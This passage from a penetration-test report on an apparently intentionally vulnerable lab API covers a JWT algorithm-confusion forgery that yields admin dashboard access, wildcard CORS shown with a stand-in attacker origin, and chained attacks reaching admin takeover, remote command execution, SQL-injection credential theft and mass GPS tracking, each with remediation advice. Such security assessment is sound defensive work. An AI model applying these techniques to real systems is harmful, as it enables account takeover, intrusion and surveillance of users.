A standard user's token was used as the starting token structure. The server accepted a forged token identifying the administrator and returned administrator dashboard data. The standard user's token decodes to:

```json

// header:  {"alg":"RS256"}

// payload: {"sub":"[USER_EMAIL]","role":"user", ...}

```

Using Burp's JWT Editor "HMAC Key Confusion" attack, the public RSA key was converted (PEM → Base64) into the secret for an **HS256**-signed forgery of the same token:

```

GET /identity/api/v2/user/dashboard

Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.[payload].[REDACTED-FORGED-SIG]

→ 200 {"email":"[USER_EMAIL]","role":"ROLE_USER", ...}

```

The server accepted an **HS256** token where it expected **RS256**, confirming the backend's verification logic does not pin the expected algorithm and instead trusts the `alg` header the client supplies — meaning the server effectively used its own **public** key as an HMAC secret to "verify" a token anyone could forge.

**Administrator dashboard access:** The `sub` claim was then replaced with the admin email leaked in F-01, re-signed with the same forged HMAC technique, and replayed with **no password, OTP, or prior admin session of any kind**:

```json

// forged payload: {"sub":"[ADMIN_EMAIL]","role":"user", ...}

```

```

GET /identity/api/v2/user/dashboard

Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.[admin-payload].[REDACTED-FORGED-SIG]

→ 200 {"id":5,"name":"Admin","email":"[ADMIN_EMAIL]","role":"ROLE_ADMIN", "available_credit":100.0, ...}

```

This demonstrates that a standard user can use public JWKS material to forge a token with an arbitrary account subject and retrieve the administrator dashboard response without administrator credentials or an existing administrator session. The evidence establishes dashboard data access; it does not document a successful admin-only state-changing operation. The score therefore reflects the demonstrated confidentiality impact only.

**Remediation:** Hard-code / allow-list the single expected signing algorithm (`RS256`) in the JWT verification library and reject any token whose header specifies a different algorithm, **before** attempting signature verification. Never derive HMAC secrets from material that is also used/published as an asymmetric public key. Enforce RS256 verification and reject unexpected algorithms. Rotate the key only if there is evidence of actual key compromise or as part of a deliberate incident-response decision; publishing a public key through JWKS is normal.

---

### F-17 — Permissive CORS Policy (`Access-Control-Allow-Origin: *`)

**Endpoint:** Identity service (observed broadly), e.g. `GET /identity/api/v2/user/dashboard`

**CVSS v4.0:** Not independently scored — the evidence demonstrates wildcard CORS headers, but not a standalone cross-origin attack that produces an impact without a separately compromised bearer token.

**Exploit:** Requests sent with an arbitrary, untrusted `Origin` header were honored identically to same-origin requests:

```

GET /identity/api/v2/user/dashboard

Origin: http://attacker-malicious-site.com

Authorization: Bearer eyJ...[REDACTED]

→ 200 Access-Control-Allow-Origin: *

   {"email":"[USER_EMAIL]", ...}

```

Because the API relies on an `Authorization: Bearer` header (not a cookie automatically attached by the browser) for auth, a wildcard CORS policy alone does not let a passive third-party site silently exfiltrate a victim's session — exploitation still requires the attacker's page to already possess the victim's token (e.g., via XSS or local storage access). However, the wildcard policy removes a meaningful defense-in-depth layer and **meaningfully compounds F-16**: a token forged or stolen through any other means can be replayed from *\*any\** origin without CORS acting as a secondary control.

**Remediation:** Restrict `Access-Control-Allow-Origin` to an explicit allow-list of trusted front-end origins. Never combine a wildcard CORS policy with endpoints that return sensitive, authenticated data.

---

## 2.2 Attack Chains

The individual findings above compound into several end-to-end attack paths that materially increase real-world risk beyond what any single CVSS score conveys.

### Chain A — BOLA → Credential Harvesting → Full Admin Account Takeover

```

F-01 (BOLA: /orders/{id})

   → leaks [ADMIN_EMAIL]

F-02 (unthrottled legacy OTP endpoint)

   → brute-force 4-digit OTP (10,000 keyspace, found at \~2,765 attempts)

   → attacker-controlled password reset

   → full administrator login

```

**Net effect:** An attacker with only a free customer account obtains the admin's email by ID-cycling an unrelated endpoint, then fully resets and takes over the admin account using an endpoint the current UI doesn't even expose, because it was never decommissioned.

### Chain B — Excessive Data Exposure → Mass Assignment → SSRF → Remote Command Execution

```

F-05 (GET /videos/{id} leaks "conversion_params")

   → reveals a raw shell-flag string is persisted server-side

F-06 (PUT /videos/{id} accepts "conversion_params" as writable)

   → attacker overwrites it with injected shell metacharacters

F-07 (SSRF via "mechanic_api" reaches the internal-only convert_video endpoint)

   → triggers server-side execution of the poisoned conversion_params value

F-08 (OS Command Injection, confirmed via sleep() timing: 405ms → 10.5s → 25.7s)

   → arbitrary command execution on the crapi-identity backend

```

**Net effect:** Four findings that are each Medium-to-High in isolation combine into a **Critical, authenticated remote-code-execution primitive** against an internal microservice that was never meant to be reachable from outside the cluster at all.

### Chain C — SQL Injection → Credential Disclosure → Offline Credential Attack

```

F-14 (SQLi in /apply_coupon "coupon_code")

   → UNION-based exfiltration of user_login table

   → admin email + bcrypt password hash disclosed

   → (out of scope of this test) offline hash cracking / credential reuse checks

```

**Net effect:** This path independently exposes administrator credential material and may enable further compromise if the password is recovered or reused. Password cracking and credential-reuse testing were outside the scope of this assessment. `sqlmap` reported stacked-query detection, but write/availability impact was not demonstrated.

### Chain D — JWT Algorithm Confusion: Administrator Impersonation Without Admin Credentials

```

F-16 (public JWKS + algorithm confusion)

   → forge arbitrary "sub" claim, including [ADMIN_EMAIL]

   → ROLE_ADMIN dashboard access.

   (compounded by F-17 permissive CORS, removing one layer of defense-in-depth)

```

**Net effect:** The demonstrated attack requires no administrator password, OTP, or administrator session, and can bypass Chains A and C. It does, however, begin with a valid standard-user token. Algorithm pinning must therefore be remediated independently of the password-reset flow.

### Chain E — Excessive Data Exposure → BOLA: Mass Physical Location Tracking

```

F-09 (forum "recent posts" leaks email + internal vehicleid for every author)

   → F-03 (BOLA on /vehicle/{id}/location accepts any vehicleid)

   → attacker iterates every vehicleid harvested from the forum

   → live GPS coordinates for the entire user base who's vehicle ID's are exposed through the "community" endpoint

```

**Net effect:** A "low severity" information-disclosure bug (exposing an internal GUID in a social feature) becomes a mass physical-tracking capability once paired with a missing ownership check on an unrelated service.

### Chain F — Unauthenticated Access + BFLA: Anonymous Tampering With Other Users' Data

```

F-15 (orders endpoint requires no auth at all)

   + F-11 (standard-user token reaches admin-only delete function)

   → combined, demonstrates that both the "front door" (authentication)

     and the "inner door" (authorization) of this API can independently fail,

     on different endpoints, within the same service boundary

```

**Net effect:** While F-15 and F-11 don't technically chain into one request, together they demonstrate a systemic pattern: authorization is treated as optional/inconsistent across the codebase rather than enforced centrally, which is itself the most important finding to communicate to engineering leadership — point fixes to individual endpoints will not resolve the underlying architectural gap.

---

## 2.3 Methodology & Tooling

- **Proxy/Manipulation:** Burp Suite (Repeater, Autorizer extension for differential auth testing, JWT Editor extension for algorithm-confusion attacks)
- **Brute Force:** `ffuf` (OTP keyspace enumeration)
- **Injection Discovery/Confirmation:** `sqlmap` (boolean-based, time-based, stacked-query, and UNION-based SQL injection techniques against PostgreSQL)
- **Scoring:** CVSS v4.0 Base-only (CVSS-B) metrics using FIRST.org’s reference scoring method; OWASP API Security Top 10 (2023) category mapping. See [FIRST CVSS v4.0 Specification](https://www.first.org/cvss/v4.0/specification-document) and [FIRST CVSS v4.0 Calculator](https://www.first.org/cvss/calculator/v4-0).

## 2.4 Appendix — CWE Mapping

| ID                     | CWE                                                                                                                                   |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| F-01, F-03, F-04, F-09 | CWE-639: Authorization Bypass Through User-Controlled Key                                                                             |
| F-02                   | CWE-307: Improper Restriction of Excessive Authentication Attempts; CWE-640: Weak Password Recovery                                   |
| F-05, F-06             | CWE-213 / CWE-915: Exposure of Sensitive Information / Improperly Controlled Modification of Dynamically-Determined Object Attributes |
| F-07                   | CWE-918: Server-Side Request Forgery                                                                                                  |
| F-08                   | CWE-78: OS Command Injection                                                                                                          |
| F-10                   | CWE-770: Allocation of Resources Without Limits or Throttling                                                                         |
| F-11                   | CWE-285: Improper Authorization                                                                                                       |
| F-12                   | CWE-840: Business Logic Errors                                                                                                        |
| F-13                   | CWE-943: Improper Neutralization of Special Elements in Data Query Logic (NoSQL Injection)                                            |
| F-14                   | CWE-89: SQL Injection                                                                                                                 |
| F-15                   | CWE-306: Missing Authentication for Critical Function                                                                                 |
| F-16                   | CWE-347: Improper Verification of Cryptographic Signature                                                                             |
| F-17                   | CWE-942: Permissive Cross-domain Policy                                                                                               |

---

*\*End of report. All findings were reproduced against an isolated lab instance for training/assessment purposes.\**
